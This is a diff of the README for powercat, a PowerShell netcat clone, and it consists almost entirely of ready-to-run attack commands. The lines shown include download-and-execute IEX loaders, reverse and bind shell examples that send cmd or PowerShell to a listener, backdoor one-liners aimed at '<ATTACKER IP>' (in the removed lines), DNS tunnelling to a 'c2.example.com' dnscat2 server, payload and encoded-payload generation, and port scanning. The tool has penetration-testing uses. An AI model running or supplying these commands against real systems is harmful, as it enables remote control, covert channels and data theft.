@@ -1,6 +1,15 @@
-#powercat
-
+powercat
+========
 Netcat: The powershell version. (Powershell Version 2 and Later Supported)
+
+Installation
+------------
+powercat is a powershell function.  First you need to load the function before you can execute it.  You can put one of the below commands into your powershell profile so powercat is automatically loaded when powershell starts.
+###
+    Load The Function From Downloaded .ps1 File:
+        . .\powercat.ps1
+    Load The Function From URL:
+        IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
 
 ### Parameters:
     -l      Listen for a connection.                             [Switch]
@@ -14,49 +23,81 @@ Netcat: The powershell version. (Powershell Version 2 and Later Supported)
     -dnsft  DNS Failure Threshold.                               [int32]
     -t      Timeout option. Default: 60                          [int32]
     -i      Input: Filepath (string), byte array, or string.     [object]
-    -o      Output Type: "Host", "Bytes", or "String"            [String]
+    -o      Console Output Type: "Host", "Bytes", or "String"    [String]
+    -of     Output File Path.                                    [String]
     -d      Disconnect after connecting.                         [Switch]
     -rep    Repeater. Restart after disconnecting.               [Switch]
+    -g      Generate Payload.                                    [Switch]
+    -ge     Generate Encoded Payload.                            [Switch]
     -h      Print the help message.                              [Switch]
-### General Usage Examples:
-    Listen and Connect:
-        powercat -l 443
-        powercat -c 10.1.1.10 443
-    Serve and Send Shells:
-        powercat -l -e cmd.exe 443
-        powercat -c 10.1.1.10 -e cmd.exe 443
-        powercat -l -ep 443
-        powercat -c 10.1.1.10 -ep 443
-    Output to a File:
-        powercat -l -p 8000 -o "String" | Out-File C:\outputfile
-        [IO.File]::WriteAllBytes("C:\outputfile",(powercat -l -p 8000 -o "Bytes"))
-    Send a File:
-        powercat -c 10.1.1.10 -p 443 -i "C:\inputfile"
-        ([IO.File]::ReadAllBytes('C:\inputfile')) | powercat -c 10.1.1.10 -p 443
-### powercat Relay Examples:
-    Listener to Client Relay (TCP to TCP):
+
+Basic Connections
+-----------------------------------
+By default, powercat reads input from the console and writes input to the console using write-host. You can change the output type to 'Bytes', or 'String' with -o.
+###
+    Basic Client:
+        powercat -c 10.1.1.1 -p 443
+    Basic Listener:
+        powercat -l -p 8000
+    Basic Client, Output as Bytes:
+        powercat -c 10.1.1.1 -p 443 -o Bytes
+    
+File Transfer
+-------------
+powercat can be used to transfer files back and forth using -i (Input) and -of (Output File).
+###
+    Send File:
+        powercat -c 10.1.1.1 -p 443 -i C:\inputfile
+    Recieve File:
+        powercat -l -p 8000 -of C:\inputfile
+
+Shells
+------
+powercat can be used to send and server shells. Specify an executable to -e, or use -ep to execute powershell.
+###
+    Serve a cmd Shell:
+        powercat -l -p 443 -e cmd
+    Send a cmd Shell:
+        powercat -c 10.1.1.1 -p 443 -e cmd
+    Serve a shell which executes powershell commands:
+        powercat -l -p 443 -ep
+
+DNS and UDP
+-----------
+powercat supports more than sending data over TCP. Specify -u to enable UDP Mode. Data can also be sent to a dnscat2 server with -dns.
+###
+    Send Data Over UDP:
+        powercat -c 10.1.1.1 -p 8000 -u
+        powercat -l -p 8000 -u
+    Send Data To the c2.example.com dnscat2 server, sending queries to the dns server on 10.1.1.1:
+        powercat -c 10.1.1.1 -p 53 -dns c2.example.com
+
+Relays
+------
+Relays in powercat work just like traditional netcat relays, but you don't have to create a file or start a second process. You can also relay data between connections of different protocols.
+###
+    TCP Listener to TCP Client Relay:
         powercat -l -p 8000 -r tcp:10.1.1.16:443
-    Listener to Listener Relay (TCP to TCP):
-        powercat -l -p 8000 -r tcp:4444
-    Client to Listener Relay (TCP to TCP):
-        powercat -c 10.1.1.16 -p 443 -r tcp:4444
-    Client to Client Relay (TCP to TCP):
-        powercat -c 10.1.1.16 -p 443 -r tcp:10.1.1.16:3389
-    Listener to Client Relay (TCP to UDP):
+    TCP Listener to UDP Client Relay:
         powercat -l -p 8000 -r udp:10.1.1.16:53
-    Listener to Client Relay (TCP to DNS)
+    TCP Listener to DNS Client Relay
         powercat -l -p 8000 -r dns:10.1.1.1:53:c2.example.com
-### Other Protocols
-    Send a powershell shell out over UDP:
-        powercat -c 10.1.1.16 -p 8000 -u -ep
-    Send a shell to the dnscat2 server at c2.example.com, sending queries to 10.1.1.1
-        powercat -c 10.1.1.1 -p 53 -dns c2.example.com -e cmd
-### Misc Examples:
-    Download and Execute Powercat Backdoor Listener One-Liner:
-        powershell -c "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -l 8000 -e cmd.exe"
-    Download and Execute Powercat Reverse Shell One-Liner (Replace <Attacker IP>):
-        powershell -c "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c <ATTACKER IP> 443 -e cmd.exe"
+
+Generate Payloads
+-----------------
+Payloads which do a specific action can be generated using -g (Generate Payload) and -ge (Generate Encoded Payload). You can use these if you don't want to use all of powercat.
+###
+    Generate a reverse tcp shell script which connects back to 10.1.1.15 port 443:
+        powercat -c 10.1.1.15 -p 443 -g
+    Generate a bind tcp shell encoded command which listens on port 8000:
+        powercat -l -p 8000 -ge
+
+Misc Usage
+----------
+powercat can also be used to perform portscans, and start persistent servers.
+###
     Basic TCP Port Scanner:
         (21,22,80,443) | % {powercat -c 10.1.1.10 -p $_ -t 1 -Verbose -d}
     Start A Persistent Server That Serves a File:
         powercat -l -p 443 -i C:\inputfile -rep
+
